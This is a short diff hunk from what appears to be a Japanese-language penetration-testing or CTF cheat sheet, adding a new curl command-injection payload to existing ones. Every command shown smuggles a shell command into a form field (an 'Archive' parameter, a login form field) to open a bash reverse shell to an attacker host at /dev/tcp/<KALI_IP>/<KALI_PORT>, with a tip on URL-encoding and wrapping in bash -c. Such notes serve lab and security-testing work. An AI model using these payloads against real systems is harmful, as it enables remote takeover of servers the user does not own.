@@ -196,3 +196,7 @@ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C
    ```bash
    curl -X POST --data-urlencode 'Archive=git;bash -i >& /dev/tcp/<KALI_IP>/<KALI_PORT> 0>&1' http://<TARGET_IP>:8000/archive
    ```
+   ```bash
+   ### --url-encodeは入力ごとにつける。Bashが通らないときは bash -c "~"でくくる。
+   curl -X POST --data-urlencode 'username=test' --data-urlencode 'password=x' --data-urlencode 'ffa=x$(bash -c "bash -i >& /dev/tcp/<KALI_IP>/<KALI_PORT> 0>&1")' http://$<TARGET_IP>/login
+   ```
